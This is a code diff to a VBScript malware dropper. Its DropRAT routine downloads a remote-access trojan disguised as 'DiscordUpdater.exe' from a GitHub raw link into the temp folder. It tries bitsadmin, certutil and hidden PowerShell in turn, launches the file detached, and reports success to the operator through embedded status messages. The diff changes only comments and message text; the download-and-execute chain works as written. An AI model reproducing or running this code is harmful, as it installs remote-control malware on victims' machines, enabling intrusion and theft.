@@ -146,7 +146,7 @@ End Sub
 Sub DropRAT()
     Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\DiscordUpdater.exe"
     
-    ' YOUR EXACT GITHUB RAW LINK
+    ' YOUR GITHUB LINK
     Dim dl: dl = "https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/DiscordUpdater.exe"
     
     If fso.FileExists(temp) Then fso.DeleteFile temp
@@ -155,16 +155,14 @@ Sub DropRAT()
 
     ' 1. Try bitsadmin in the background
     sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, False
-    
-    ' Wait 5 seconds to see if bitsadmin worked
     Call SleepSeconds(5)
 
-    ' 2. Fallback to certutil if bitsadmin failed/hung
+    ' 2. Fallback to certutil
     If Not fso.FileExists(temp) Then
         sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
     End If
     
-    ' 3. Fallback to PowerShell if certutil failed
+    ' 3. Fallback to PowerShell
     If Not fso.FileExists(temp) Then
         sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
     End If
@@ -172,15 +170,11 @@ Sub DropRAT()
     ' 4. Run if downloaded
     If fso.FileExists(temp) Then
         Call PostEmbed("🚀 RAT Downloaded", "Size: " & CStr(fso.GetFile(temp).Size) & " bytes", 3447003)
-        
-        ' Set Working Directory so PyInstaller doesn't crash
         sh.CurrentDirectory = sh.ExpandEnvironmentStrings("%TEMP%")
-        
-        ' Launch detached
         sh.Run "cmd.exe /c start """" """ & temp & """", 0, False
         Call PostEmbed("✅ RAT", "Payload executed successfully", 65280)
     Else
-        Call PostEmbed("⌛ RAT Error", "Download failed on all methods. Link is likely expired.", 16711680)
+        Call PostEmbed("⌛ RAT Error", "Download failed.", 16711680)
     End If
 End Sub
 
